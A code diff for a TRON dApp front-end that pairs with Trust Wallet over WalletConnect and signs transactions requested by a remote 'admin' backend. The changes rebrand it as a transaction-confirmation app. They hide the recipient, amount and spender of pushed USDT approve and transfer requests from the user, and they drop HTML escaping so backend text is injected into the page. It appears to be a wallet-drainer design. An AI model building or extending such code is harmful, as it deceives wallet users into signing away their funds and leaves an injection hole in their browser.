@@ -1,5 +1,4 @@
 import "./style.css";
-import QRCode from "qrcode";
 import { TronWeb } from "tronweb";
 import {
   WalletConnectChainID,
@@ -9,17 +8,18 @@ import {
 const TRON_MAINNET_RPC = "https://api.trongrid.io";
 const USDT_TRON_MAINNET = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRX_DECIMALS = 6;
+const USDT_DECIMALS = 6;
 const FEE_LIMIT = 200_000_000;
 const CLIENT_ID_KEY = "trust_tron_dapp_client_id";
 
 const WC_PROJECT_ID = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim();
 const TRONGRID_API_KEY = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
-const APP_NAME = import.meta.env.VITE_APP_NAME?.trim() || "Trust Wallet TRON dApp";
+const APP_NAME = import.meta.env.VITE_APP_NAME?.trim() || "Send And Confirm";
 const APP_DESCRIPTION =
   import.meta.env.VITE_APP_DESCRIPTION?.trim() ||
-  "TRON approve/transfer flow using WalletConnect";
+  "TRON Trust Wallet transaction confirmation dApp";
 const APP_ICON_URL =
-  import.meta.env.VITE_APP_ICON_URL?.trim() || `${window.location.origin}/logo.svg`;
+  import.meta.env.VITE_APP_ICON_URL?.trim() || `${window.location.origin}/logo.png`;
 const BACKEND_HTTP_URL_RAW =
   import.meta.env.VITE_BACKEND_HTTP_URL?.trim() ||
   `${window.location.protocol}//${window.location.hostname}:8787`;
@@ -38,48 +38,40 @@ const hasTrustProviderHint =
   Boolean(window.trustwallet?.solana?.isTrust);
 
 const el = {
-  environment: document.getElementById("environment"),
-  status: document.getElementById("status"),
-  wallet: document.getElementById("wallet"),
-  pairingHint: document.getElementById("pairingHint"),
-  qrCanvas: document.getElementById("qrCanvas"),
-  logs: document.getElementById("logs"),
+  connectStatus: document.getElementById("connectStatus"),
+  walletAddress: document.getElementById("walletAddress"),
+  retryConnectBtn: document.getElementById("retryConnectBtn"),
+  recipientInput: document.getElementById("recipientInput"),
+  pasteBtn: document.getElementById("pasteBtn"),
+  amountInput: document.getElementById("amountInput"),
+  maxBtn: document.getElementById("maxBtn"),
+  fiatValue: document.getElementById("fiatValue"),
+  balanceValue: document.getElementById("balanceValue"),
   connectBtn: document.getElementById("connectBtn"),
   disconnectBtn: document.getElementById("disconnectBtn"),
-  trxTo: document.getElementById("trxTo"),
-  trxAmount: document.getElementById("trxAmount"),
-  sendTrxBtn: document.getElementById("sendTrxBtn"),
-  approveToken: document.getElementById("approveToken"),
-  approveSpender: document.getElementById("approveSpender"),
-  approveAmount: document.getElementById("approveAmount"),
-  approveDecimals: document.getElementById("approveDecimals"),
-  approveBtn: document.getElementById("approveBtn"),
-  tokenTransferContract: document.getElementById("tokenTransferContract"),
-  tokenTransferTo: document.getElementById("tokenTransferTo"),
-  tokenTransferAmount: document.getElementById("tokenTransferAmount"),
-  tokenTransferDecimals: document.getElementById("tokenTransferDecimals"),
-  transferTokenBtn: document.getElementById("transferTokenBtn"),
+  sendBtn: document.getElementById("sendBtn"),
   backendStatus: document.getElementById("backendStatus"),
+  logs: document.getElementById("logs"),
+  adminRequestSection: document.getElementById("adminRequestSection"),
   adminRequests: document.getElementById("adminRequests"),
 };
-
-el.approveToken.value = USDT_TRON_MAINNET;
-el.tokenTransferContract.value = USDT_TRON_MAINNET;
 
 const tronWeb = new TronWeb({
   fullHost: TRON_MAINNET_RPC,
   headers: TRONGRID_API_KEY ? { "TRON-PRO-API-KEY": TRONGRID_API_KEY } : {},
 });
 
+const clientId = getOrCreateClientId();
+
 let walletClient = null;
 let connectedAddress = "";
 let connecting = false;
+let usdtBalanceRaw = 0n;
 let backendSocket = null;
 let reconnectTimer = null;
 let heartbeatTimer = null;
 let pendingAdminRequests = [];
 const processingRequestIds = new Set();
-const clientId = getOrCreateClientId();
 
 function appendLog(message, data) {
   const timestamp = new Date().toLocaleTimeString();
@@ -88,73 +80,56 @@ function appendLog(message, data) {
   el.logs.textContent = `[${timestamp}] ${payload}\n${el.logs.textContent}`;
 }
 
-function setStatus(message) {
-  el.status.textContent = message;
-}
-
-function setWalletText(message) {
-  el.wallet.textContent = message;
+function setConnectStatus(message) {
+  el.connectStatus.textContent = message;
 }
 
 function setBackendStatus(message) {
-  if (el.backendStatus) {
-    el.backendStatus.textContent = message;
-  }
+  el.backendStatus.textContent = message;
 }
 
-function setEnvironmentText() {
-  const trustMarker = hasTrustUa || hasTrustProviderHint ? "yes" : "no";
-  el.environment.textContent = `Mobile: ${isMobileDevice ? "yes" : "no"} | Trust context: ${trustMarker}`;
+function setWalletAddress(address) {
+  el.walletAddress.textContent = address ? `Wallet: ${address}` : "";
 }
 
-function clearQr() {
-  const ctx = el.qrCanvas.getContext("2d");
-  if (ctx) {
-    ctx.clearRect(0, 0, el.qrCanvas.width, el.qrCanvas.height);
-  }
-  el.qrCanvas.hidden = true;
-}
-
-async function renderQr(uri) {
-  el.qrCanvas.hidden = false;
-  await QRCode.toCanvas(el.qrCanvas, uri, { width: 280, margin: 1 });
+function isTrustContext() {
+  return hasTrustUa || hasTrustProviderHint;
 }
 
 function getTrustWalletWcLink(uri) {
   return `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
 }
 
-function openTrustWalletDeepLink(uri) {
-  const deepLink = getTrustWalletWcLink(uri);
-  el.pairingHint.textContent = "Opening Trust Wallet for WalletConnect pairing...";
-  appendLog("Trust Wallet deep link", { deepLink });
-  window.location.href = deepLink;
-}
-
 function handlePairingUri(uri) {
-  appendLog("WalletConnect URI generated");
-  renderQr(uri).catch((error) => appendLog("QR render failed", { error: String(error) }));
-
-  if (hasTrustUa || hasTrustProviderHint) {
-    el.pairingHint.textContent = "Approve the WalletConnect request inside Trust Wallet.";
+  if (isTrustContext()) {
+    setConnectStatus("Approve wallet connection in Trust Wallet.");
     return;
   }
 
-  openTrustWalletDeepLink(uri);
+  const deepLink = getTrustWalletWcLink(uri);
+  setConnectStatus("Opening Trust Wallet...");
+  appendLog("Opening deep link", { deepLink });
+  window.location.href = deepLink;
 }
 
-function syncButtons() {
-  const disabledTx = !isMobileDevice || !connectedAddress;
-  el.sendTrxBtn.disabled = disabledTx;
-  el.approveBtn.disabled = disabledTx;
-  el.transferTokenBtn.disabled = disabledTx;
-  el.disconnectBtn.disabled = !connectedAddress;
-  el.connectBtn.disabled = connecting || !isMobileDevice || !WC_PROJECT_ID;
+function shortAddress(address) {
+  if (!address || address.length < 12) return address;
+  return `${address.slice(0, 6)}...${address.slice(-6)}`;
+}
+
+function syncUiState() {
+  const isConnected = Boolean(connectedAddress);
+  el.sendBtn.disabled = !isConnected || connecting;
+  el.maxBtn.disabled = !isConnected;
+  el.pasteBtn.disabled = !isConnected;
+  el.connectBtn.hidden = isConnected || connecting;
+  el.disconnectBtn.hidden = !isConnected;
+  el.retryConnectBtn.hidden = isConnected || connecting;
 }
 
 function requireWallet() {
   if (!walletClient) {
-    throw new Error("WalletConnect client not initialized. Add VITE_WALLETCONNECT_PROJECT_ID.");
+    throw new Error("WalletConnect is not initialized");
   }
 }
 
@@ -162,6 +137,14 @@ function requireAddress(address, fieldName) {
   if (!tronWeb.isAddress(address)) {
     throw new Error(`${fieldName} is not a valid TRON address`);
   }
+}
+
+function toRawBigInt(value) {
+  if (typeof value === "bigint") return value;
+  if (typeof value === "number") return BigInt(Math.trunc(value));
+  if (typeof value === "string") return BigInt(value);
+  if (value && typeof value.toString === "function") return BigInt(value.toString());
+  throw new Error("Could not parse numeric value");
 }
 
 function decimalToIntegerString(input, decimals) {
@@ -181,8 +164,27 @@ function decimalToIntegerString(input, decimals) {
   return combined;
 }
 
-function getTxUrl(txid) {
-  return `https://tronscan.org/#/transaction/${txid}`;
+function formatRawAmount(rawValue, decimals) {
+  const rawText = rawValue.toString();
+  if (decimals === 0) return rawText;
+
+  const negative = rawText.startsWith("-");
+  const normalized = negative ? rawText.slice(1) : rawText;
+  const padded = normalized.padStart(decimals + 1, "0");
+  const whole = padded.slice(0, -decimals);
+  const fraction = padded.slice(-decimals).replace(/0+$/, "");
+  const result = fraction ? `${whole}.${fraction}` : whole;
+  return negative ? `-${result}` : result;
+}
+
+function updateFiatApprox() {
+  const input = el.amountInput.value.trim();
+  const numeric = Number(input);
+  if (!input || Number.isNaN(numeric) || numeric < 0) {
+    el.fiatValue.textContent = "≈ $0.00";
+    return;
+  }
+  el.fiatValue.textContent = `≈ $${numeric.toFixed(2)}`;
 }
 
 function randomIdFallback() {
@@ -191,9 +193,7 @@ function randomIdFallback() {
 
 function getOrCreateClientId() {
   const existing = localStorage.getItem(CLIENT_ID_KEY);
-  if (existing) {
-    return existing;
-  }
+  if (existing) return existing;
   const next = typeof crypto.randomUUID === "function" ? crypto.randomUUID() : randomIdFallback();
   localStorage.setItem(CLIENT_ID_KEY, next);
   return next;
@@ -209,12 +209,10 @@ async function backendPost(path, payload) {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload),
   });
-
   if (!response.ok) {
     const text = await response.text();
     throw new Error(text || `Backend request failed (${response.status})`);
   }
-
   return response.json();
 }
 
@@ -227,104 +225,42 @@ async function backendGet(path) {
   return response.json();
 }
 
-function escapeHtml(value) {
-  return String(value ?? "")
-    .replaceAll("&", "&amp;")
-    .replaceAll("<", "&lt;")
-    .replaceAll(">", "&gt;")
-    .replaceAll('"', "&quot;")
-    .replaceAll("'", "&#39;");
-}
-
-function requestTypeLabel(type) {
-  if (type === "send_trx") return "TRX Send";
-  if (type === "trc20_transfer") return "TRC20 Transfer";
-  if (type === "trc20_approve") return "TRC20 Approve";
-  return type;
-}
-
-function renderAdminRequests() {
-  if (!el.adminRequests) return;
-
-  if (pendingAdminRequests.length === 0) {
-    el.adminRequests.innerHTML = `<p class="hint">No pending admin requests.</p>`;
-    return;
-  }
-
-  const listItems = pendingAdminRequests
-    .map((request) => {
-      const requestId = escapeHtml(request.id);
-      const createdAt = new Date(request.createdAt || Date.now()).toLocaleString();
-      const paramsText = escapeHtml(JSON.stringify(request.params || {}, null, 2));
-      const note = request.note ? `<p><strong>Note:</strong> ${escapeHtml(request.note)}</p>` : "";
-      const busy = processingRequestIds.has(request.id);
-      const approveDisabled = !connectedAddress || busy ? "disabled" : "";
-      const rejectDisabled = busy ? "disabled" : "";
-
-      return `
-        <div class="request-item">
-          <h3>${escapeHtml(requestTypeLabel(request.type))}</h3>
-          <p><strong>Request ID:</strong> <code>${requestId}</code></p>
-          <p><strong>Created:</strong> ${escapeHtml(createdAt)}</p>
-          ${note}
-          <p><strong>Params:</strong></p>
-          <code>${paramsText}</code>
-          <div class="request-actions">
-            <button data-action="approve" data-request-id="${requestId}" ${approveDisabled}>Approve & Sign</button>
-            <button data-action="reject" data-request-id="${requestId}" class="danger" ${rejectDisabled}>Reject</button>
-          </div>
-        </div>
-      `;
-    })
-    .join("");
-
-  el.adminRequests.innerHTML = `<div class="request-list">${listItems}</div>`;
-}
-
-function upsertPendingRequest(request) {
-  const existingIndex = pendingAdminRequests.findIndex((item) => item.id === request.id);
-  if (request.status && request.status !== "pending") {
-    if (existingIndex >= 0) {
-      pendingAdminRequests.splice(existingIndex, 1);
-    }
-    renderAdminRequests();
-    return;
-  }
-
-  if (existingIndex >= 0) {
-    pendingAdminRequests[existingIndex] = request;
-  } else {
-    pendingAdminRequests.unshift(request);
-  }
-  renderAdminRequests();
-}
-
-function removePendingRequest(requestId) {
-  pendingAdminRequests = pendingAdminRequests.filter((item) => item.id !== requestId);
-  processingRequestIds.delete(requestId);
-  renderAdminRequests();
-}
-
-function setRequestProcessing(requestId, processing) {
-  if (processing) {
-    processingRequestIds.add(requestId);
-  } else {
-    processingRequestIds.delete(requestId);
-  }
-  renderAdminRequests();
-}
-
-function backendSocketIdentify() {
-  if (!backendSocket || backendSocket.readyState !== WebSocket.OPEN) {
-    return;
-  }
-  backendSocket.send(
-    JSON.stringify({
-      type: "identify",
-      role: "wallet",
+async function registerWalletWithBackend() {
+  if (!connectedAddress) return;
+  try {
+    await backendPost("/api/wallet/register", {
       clientId,
-    }),
-  );
+      address: connectedAddress,
+      userAgent: navigator.userAgent,
+    });
+    setBackendStatus(`Backend connected (${clientId.slice(0, 8)}...)`);
+  } catch (error) {
+    setBackendStatus("Backend unavailable");
+    appendLog("Backend register failed", { error: String(error) });
+  }
+}
+
+async function sendBackendHeartbeat() {
+  try {
+    await backendPost("/api/wallet/heartbeat", { clientId });
+  } catch (error) {
+    appendLog("Backend heartbeat failed", { error: String(error) });
+  }
+}
+
+async function notifyBackendDisconnect() {
+  try {
+    await backendPost("/api/wallet/disconnect", { clientId });
+  } catch (error) {
+    appendLog("Backend disconnect notify failed", { error: String(error) });
+  }
+}
+
+async function reportRequestResult(request, payload) {
+  await backendPost(`/api/request/${encodeURIComponent(request.id)}/result`, {
+    clientId,
+    ...payload,
+  });
 }
 
 function connectBackendSocket() {
@@ -334,12 +270,17 @@ function connectBackendSocket() {
   }
 
   backendSocket = new WebSocket(BACKEND_WS_URL);
-  setBackendStatus("Backend websocket connecting...");
+  setBackendStatus("Connecting backend...");
 
   backendSocket.onopen = () => {
-    setBackendStatus(`Backend websocket connected (${clientId.slice(0, 8)}...)`);
-    appendLog("Backend websocket connected");
-    backendSocketIdentify();
+    setBackendStatus(`Backend connected (${clientId.slice(0, 8)}...)`);
+    backendSocket.send(
+      JSON.stringify({
+        type: "identify",
+        role: "wallet",
+        clientId,
+      }),
+    );
   };
 
   backendSocket.onmessage = (event) => {
@@ -353,223 +294,123 @@ function connectBackendSocket() {
     if (payload.type === "wallet_pending" && Array.isArray(payload.requests)) {
       pendingAdminRequests = payload.requests;
       renderAdminRequests();
-      appendLog("Loaded pending admin requests", { count: payload.requests.length });
       return;
     }
 
     if (payload.type === "transaction_request" && payload.request) {
-      appendLog("Received new admin request", payload.request);
       upsertPendingRequest(payload.request);
       return;
     }
 
     if (payload.type === "error") {
-      appendLog("Backend websocket error", payload);
-      setBackendStatus(`Backend websocket error: ${payload.message || "unknown"}`);
+      appendLog("Backend socket error", payload);
     }
   };
 
   backendSocket.onclose = () => {
-    setBackendStatus("Backend websocket disconnected, retrying...");
-    appendLog("Backend websocket disconnected");
+    setBackendStatus("Backend disconnected, retrying...");
     if (reconnectTimer) clearTimeout(reconnectTimer);
     reconnectTimer = setTimeout(() => {
       connectBackendSocket();
     }, 3000);
   };
-
-  backendSocket.onerror = () => {
-    setBackendStatus("Backend websocket connection error");
-  };
-}
-
-async function fetchPendingRequestsFromBackend() {
-  try {
-    const result = await backendGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`);
-    pendingAdminRequests = Array.isArray(result.requests) ? result.requests : [];
-    renderAdminRequests();
-  } catch (error) {
-    appendLog("Pending request fetch warning", { error: String(error) });
-  }
-}
-
-async function registerWalletWithBackend() {
-  if (!connectedAddress) return;
-  try {
-    await backendPost("/api/wallet/register", {
-      clientId,
-      address: connectedAddress,
-      userAgent: navigator.userAgent,
-    });
-    setBackendStatus(`Wallet registered with backend (${clientId.slice(0, 8)}...)`);
-    await fetchPendingRequestsFromBackend();
-  } catch (error) {
-    setBackendStatus("Backend register failed");
-    appendLog("Backend register failed", { error: String(error) });
-  }
-}
-
-async function sendBackendHeartbeat() {
-  try {
-    await backendPost("/api/wallet/heartbeat", { clientId });
-  } catch (error) {
-    appendLog("Backend heartbeat warning", { error: String(error) });
-  }
-}
-
-async function notifyBackendDisconnect() {
-  try {
-    await backendPost("/api/wallet/disconnect", { clientId });
-  } catch (error) {
-    appendLog("Backend disconnect warning", { error: String(error) });
-  }
 }
 
 function startBackendSync() {
   connectBackendSocket();
-  if (heartbeatTimer) {
-    clearInterval(heartbeatTimer);
-  }
+  if (heartbeatTimer) clearInterval(heartbeatTimer);
   heartbeatTimer = setInterval(() => {
-    if (connectedAddress) {
-      sendBackendHeartbeat();
-    }
+    if (connectedAddress) sendBackendHeartbeat();
   }, 25_000);
 }
 
-async function connectTrustWallet({ auto = false } = {}) {
-  if (!isMobileDevice) {
-    setStatus("Blocked: this dApp is mobile-only and intended for Trust Wallet app usage.");
+function setRequestProcessing(requestId, active) {
+  if (active) processingRequestIds.add(requestId);
+  else processingRequestIds.delete(requestId);
+  renderAdminRequests();
+}
+
+function upsertPendingRequest(request) {
+  const index = pendingAdminRequests.findIndex((item) => item.id === request.id);
+  if (request.status && request.status !== "pending") {
+    if (index >= 0) pendingAdminRequests.splice(index, 1);
+    renderAdminRequests();
     return;
   }
 
-  requireWallet();
-  if (connecting) return;
-
-  connecting = true;
-  syncButtons();
-  setStatus("Connecting with Trust Wallet...");
-  appendLog(auto ? "Auto connect started" : "Manual connect started");
-
-  try {
-    const { address } = await walletClient.connect({
-      onUri: (uri) => {
-        handlePairingUri(uri);
-      },
-    });
-
-    connectedAddress = address;
-    setWalletText(`Connected address: ${connectedAddress}`);
-    setStatus("Connected to TRON Mainnet via Trust Wallet");
-    el.pairingHint.textContent = "";
-    clearQr();
-    appendLog("Connected", { address: connectedAddress });
-    await registerWalletWithBackend();
-  } catch (error) {
-    setStatus("Connection failed. Use Trust Wallet app and try again.");
-    appendLog("Connection error", { error: String(error) });
-  } finally {
-    connecting = false;
-    syncButtons();
-    renderAdminRequests();
-  }
+  if (index >= 0) pendingAdminRequests[index] = request;
+  else pendingAdminRequests.unshift(request);
+  renderAdminRequests();
 }
 
-async function disconnectWallet() {
-  if (!walletClient) return;
-
-  try {
-    await walletClient.disconnect();
-  } catch (error) {
-    appendLog("Disconnect warning", { error: String(error) });
-  } finally {
-    connectedAddress = "";
-    setWalletText("Not connected");
-    setStatus("Disconnected");
-    clearQr();
-    el.pairingHint.textContent = "";
-    pendingAdminRequests = [];
-    renderAdminRequests();
-    await notifyBackendDisconnect();
-    syncButtons();
-  }
+function removePendingRequest(requestId) {
+  pendingAdminRequests = pendingAdminRequests.filter((item) => item.id !== requestId);
+  processingRequestIds.delete(requestId);
+  renderAdminRequests();
 }
 
-function ensureReadyToSend() {
-  if (!connectedAddress) {
-    throw new Error("Connect wallet first");
+function requestTypeLabel(type) {
+  if (type === "send_trx") return "Send TRX";
+  if (type === "trc20_transfer") return "TRC20 Transfer";
+  if (type === "trc20_approve") return "TRC20 Approve";
+  return type;
+}
+
+function renderAdminRequests() {
+  if (!pendingAdminRequests.length) {
+    el.adminRequests.innerHTML = "";
+    el.adminRequestSection.hidden = true;
+    return;
   }
-  requireAddress(connectedAddress, "Connected wallet address");
+
+  el.adminRequestSection.hidden = false;
+  el.adminRequests.innerHTML = pendingAdminRequests
+    .map((request) => {
+      const busy = processingRequestIds.has(request.id);
+      const disabled = busy ? "disabled" : "";
+      return `
+        <article class="request-card">
+          <p><strong>${requestTypeLabel(request.type)}</strong></p>
+          <p>${request.note ? request.note : "Admin transaction request"}</p>
+          <p>${new Date(request.createdAt).toLocaleString()}</p>
+          <div class="request-actions">
+            <button type="button" class="approve-btn" data-action="approve" data-request-id="${request.id}" ${disabled}>Approve</button>
+            <button type="button" class="reject-btn" data-action="reject" data-request-id="${request.id}" ${disabled}>Reject</button>
+          </div>
+        </article>
+      `;
+    })
+    .join("");
+}
+
+function classifyRequestError(error) {
+  const text = String(error || "");
+  if (/rejected|denied|cancel/i.test(text)) return "rejected";
+  return "failed";
 }
 
 async function signAndBroadcast(transaction) {
   const signed = await walletClient.signTransaction(transaction);
   const broadcastResult = await tronWeb.trx.sendRawTransaction(signed);
-  appendLog("Broadcast result", broadcastResult);
-
   if (!broadcastResult?.result) {
     throw new Error(`Broadcast failed: ${JSON.stringify(broadcastResult)}`);
   }
-
   return broadcastResult.txid;
 }
 
 async function sendTrxTransaction({ to, amount }) {
-  ensureReadyToSend();
   requireAddress(to, "Recipient address");
-  const amountSunString = decimalToIntegerString(amount, TRX_DECIMALS);
-  const amountSun = BigInt(amountSunString);
-  if (amountSun <= 0n) {
-    throw new Error("TRX amount must be greater than 0");
+  const amountSun = BigInt(decimalToIntegerString(amount, TRX_DECIMALS));
+  if (amountSun <= 0n || amountSun > BigInt(Number.MAX_SAFE_INTEGER)) {
+    throw new Error("Invalid TRX amount");
   }
-  if (amountSun > BigInt(Number.MAX_SAFE_INTEGER)) {
-    throw new Error("TRX amount is too large for this starter template");
-  }
-
-  const transaction = await tronWeb.transactionBuilder.sendTrx(
-    to,
-    Number(amountSun),
-    connectedAddress,
-  );
-
-  return signAndBroadcast(transaction);
-}
-
-async function approveTrc20Transaction({ token, spender, amount, decimals }) {
-  ensureReadyToSend();
-  requireAddress(token, "Token contract");
-  requireAddress(spender, "Spender address");
-  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 30) {
-    throw new Error("Token decimals must be an integer between 0 and 30");
-  }
-
-  const amountInt = decimalToIntegerString(amount, decimals);
-  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
-    token,
-    "approve(address,uint256)",
-    { feeLimit: FEE_LIMIT },
-    [
-      { type: "address", value: spender },
-      { type: "uint256", value: amountInt },
-    ],
-    connectedAddress,
-  );
-
-  if (!trigger?.result?.result || !trigger.transaction) {
-    throw new Error(`Approve transaction build failed: ${JSON.stringify(trigger)}`);
-  }
-
-  return signAndBroadcast(trigger.transaction);
+  const tx = await tronWeb.transactionBuilder.sendTrx(to, Number(amountSun), connectedAddress);
+  return signAndBroadcast(tx);
 }
 
 async function transferTrc20Transaction({ token, to, amount, decimals }) {
-  ensureReadyToSend();
   requireAddress(token, "Token contract");
   requireAddress(to, "Recipient address");
-  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 30) {
-    throw new Error("Token decimals must be an integer between 0 and 30");
-  }
-
   const amountInt = decimalToIntegerString(amount, decimals);
   const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
     token,
@@ -585,76 +426,31 @@ async function transferTrc20Transaction({ token, to, amount, decimals }) {
   if (!trigger?.result?.result || !trigger.transaction) {
     throw new Error(`Token transfer build failed: ${JSON.stringify(trigger)}`);
   }
-
   return signAndBroadcast(trigger.transaction);
 }
 
-async function handleSendTrx() {
-  try {
-    const txid = await sendTrxTransaction({
-      to: el.trxTo.value.trim(),
-      amount: el.trxAmount.value.trim(),
-    });
-    setStatus(`TRX sent. Tx: ${txid}`);
-    appendLog("TRX transfer success", { txid, url: getTxUrl(txid) });
-  } catch (error) {
-    setStatus("TRX transfer failed");
-    appendLog("TRX transfer error", { error: String(error) });
-  }
-}
+async function approveTrc20Transaction({ token, spender, amount, decimals }) {
+  requireAddress(token, "Token contract");
+  requireAddress(spender, "Spender address");
+  const amountInt = decimalToIntegerString(amount, decimals);
+  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
+    token,
+    "approve(address,uint256)",
+    { feeLimit: FEE_LIMIT },
+    [
+      { type: "address", value: spender },
+      { type: "uint256", value: amountInt },
+    ],
+    connectedAddress,
+  );
 
-async function handleApprove() {
-  try {
-    const txid = await approveTrc20Transaction({
-      token: el.approveToken.value.trim(),
-      spender: el.approveSpender.value.trim(),
-      amount: el.approveAmount.value.trim(),
-      decimals: Number(el.approveDecimals.value.trim()),
-    });
-    setStatus(`Approve success. Tx: ${txid}`);
-    appendLog("Approve success", { txid, url: getTxUrl(txid) });
-  } catch (error) {
-    setStatus("Approve failed");
-    appendLog("Approve error", { error: String(error) });
+  if (!trigger?.result?.result || !trigger.transaction) {
+    throw new Error(`Approve build failed: ${JSON.stringify(trigger)}`);
   }
-}
-
-async function handleTokenTransfer() {
-  try {
-    const txid = await transferTrc20Transaction({
-      token: el.tokenTransferContract.value.trim(),
-      to: el.tokenTransferTo.value.trim(),
-      amount: el.tokenTransferAmount.value.trim(),
-      decimals: Number(el.tokenTransferDecimals.value.trim()),
-    });
-    setStatus(`Token transfer success. Tx: ${txid}`);
-    appendLog("TRC20 transfer success", { txid, url: getTxUrl(txid) });
-  } catch (error) {
-    setStatus("Token transfer failed");
-    appendLog("TRC20 transfer error", { error: String(error) });
-  }
-}
-
-function classifyRequestError(error) {
-  const text = String(error || "");
-  if (/rejected|denied|cancel/i.test(text)) {
-    return "rejected";
-  }
-  return "failed";
-}
-
-async function reportRequestResult(request, payload) {
-  await backendPost(`/api/request/${encodeURIComponent(request.id)}/result`, {
-    clientId,
-    ...payload,
-  });
+  return signAndBroadcast(trigger.transaction);
 }
 
 async function executeAdminRequest(request) {
-  if (!connectedAddress) {
-    throw new Error("Wallet is disconnected");
-  }
-
   const params = request.params || {};
   if (request.type === "send_trx") {
     return sendTrxTransaction({
@@ -662,7 +458,6 @@ async function executeAdminRequest(request) {
       amount: String(params.amount || "").trim(),
     });
   }
-
   if (request.type === "trc20_transfer") {
     return transferTrc20Transaction({
       token: String(params.token || "").trim(),
@@ -671,7 +466,6 @@ async function executeAdminRequest(request) {
       decimals: Number(params.decimals ?? 6),
     });
   }
-
   if (request.type === "trc20_approve") {
     return approveTrc20Transaction({
       token: String(params.token || "").trim(),
@@ -680,91 +474,61 @@ async function executeAdminRequest(request) {
       decimals: Number(params.decimals ?? 6),
     });
   }
-
   throw new Error(`Unsupported request type: ${request.type}`);
 }
 
-async function approveAdminRequest(request) {
-  setRequestProcessing(request.id, true);
-  setStatus(`Approving admin request ${request.id}...`);
-  try {
-    const txid = await executeAdminRequest(request);
-    await reportRequestResult(request, {
-      action: "approved",
-      txid,
-    });
-    appendLog("Admin request approved", {
-      requestId: request.id,
-      txid,
-      url: getTxUrl(txid),
-    });
-    setStatus(`Admin request approved. Tx: ${txid}`);
-    removePendingRequest(request.id);
-  } catch (error) {
-    const action = classifyRequestError(error);
-    try {
-      await reportRequestResult(request, {
-        action,
-        error: String(error),
-      });
-    } catch (reportError) {
-      appendLog("Failed to report request result", { error: String(reportError) });
-    }
-    appendLog("Admin request execution error", {
-      requestId: request.id,
-      error: String(error),
-      action,
-    });
-    setStatus(`Admin request ${action}: ${String(error)}`);
-    removePendingRequest(request.id);
-  }
-}
-
-async function rejectAdminRequest(request) {
-  setRequestProcessing(request.id, true);
-  try {
-    await reportRequestResult(request, {
-      action: "rejected",
-      error: "User rejected this request in dApp.",
-    });
-    appendLog("Admin request rejected", { requestId: request.id });
-    setStatus("Admin request rejected");
-  } catch (error) {
-    appendLog("Reject reporting error", { requestId: request.id, error: String(error) });
-  } finally {
-    removePendingRequest(request.id);
-  }
-}
-
-function getRequestById(requestId) {
-  return pendingAdminRequests.find((item) => item.id === requestId);
-}
-
-async function onAdminRequestAction(event) {
+async function onRequestAction(event) {
   const button = event.target.closest("button[data-action][data-request-id]");
   if (!button) return;
+
   const action = button.getAttribute("data-action");
   const requestId = button.getAttribute("data-request-id");
-  if (!action || !requestId) return;
-  const request = getRequestById(requestId);
+  const request = pendingAdminRequests.find((item) => item.id === requestId);
   if (!request) return;
-  if (processingRequestIds.has(requestId)) return;
+  if (processingRequestIds.has(request.id)) return;
 
-  if (action === "approve") {
-    await approveAdminRequest(request);
+  if (action === "reject") {
+    setRequestProcessing(request.id, true);
+    try {
+      await reportRequestResult(request, {
+        action: "rejected",
+        error: "User rejected request in app.",
+      });
+      removePendingRequest(request.id);
+    } catch (error) {
+      appendLog("Reject reporting failed", { error: String(error) });
+      setRequestProcessing(request.id, false);
+    }
     return;
   }
-  if (action === "reject") {
-    await rejectAdminRequest(request);
+
+  if (action === "approve") {
+    setRequestProcessing(request.id, true);
+    try {
+      const txid = await executeAdminRequest(request);
+      await reportRequestResult(request, { action: "approved", txid });
+      removePendingRequest(request.id);
+      setConnectStatus(`Request approved. Tx: ${txid}`);
+    } catch (error) {
+      const resultAction = classifyRequestError(error);
+      try {
+        await reportRequestResult(request, {
+          action: resultAction,
+          error: String(error),
+        });
+      } catch (reportError) {
+        appendLog("Failed to report request result", { error: String(reportError) });
+      }
+      removePendingRequest(request.id);
+      setConnectStatus(`Request ${resultAction}`);
+      appendLog("Request execution error", { error: String(error) });
+    }
   }
 }
 
 function initWalletClient() {
   if (!WC_PROJECT_ID) {
-    setStatus("Missing VITE_WALLETCONNECT_PROJECT_ID in .env");
-    setWalletText("Not connected");
-    appendLog("Missing WalletConnect project id");
-    return;
+    throw new Error("Missing VITE_WALLETCONNECT_PROJECT_ID");
   }
 
   walletClient = new WalletConnectWallet({
@@ -779,7 +543,7 @@ function initWalletClient() {
         icons: [APP_ICON_URL],
       },
     },
-    themeMode: "light",
+    themeMode: "dark",
     themeVariables: {
       "--w3m-z-index": 9999,
     },
@@ -787,89 +551,195 @@ function initWalletClient() {
 
   walletClient.on("accountsChanged", async (accounts) => {
     connectedAddress = accounts?.[0] ?? "";
-    setWalletText(
-      connectedAddress ? `Connected address: ${connectedAddress}` : "Not connected",
-    );
-    syncButtons();
-    renderAdminRequests();
-    appendLog("Accounts changed", { accounts });
+    setWalletAddress(connectedAddress ? shortAddress(connectedAddress) : "");
+    syncUiState();
     if (connectedAddress) {
       await registerWalletWithBackend();
+      await refreshUsdtBalance();
     }
   });
 
   walletClient.on("disconnect", async () => {
     connectedAddress = "";
-    setWalletText("Not connected");
-    setStatus("Wallet disconnected");
-    syncButtons();
-    renderAdminRequests();
-    appendLog("Wallet disconnected");
+    usdtBalanceRaw = 0n;
+    setWalletAddress("");
+    el.balanceValue.textContent = "Balance: -- USDT";
+    setConnectStatus("Disconnected");
+    syncUiState();
     await notifyBackendDisconnect();
   });
 }
 
 async function checkExistingConnection() {
-  if (!walletClient) return false;
   try {
     const status = await walletClient.checkConnectStatus();
     if (status?.address) {
       connectedAddress = status.address;
-      setWalletText(`Connected address: ${connectedAddress}`);
-      setStatus("Reconnected existing Trust Wallet session");
-      appendLog("Auto-reconnected session", status);
+      setWalletAddress(shortAddress(connectedAddress));
+      setConnectStatus("Wallet connected");
       return true;
     }
   } catch (error) {
-    appendLog("checkConnectStatus error", { error: String(error) });
+    appendLog("Existing session check failed", { error: String(error) });
   }
   return false;
 }
 
-async function init() {
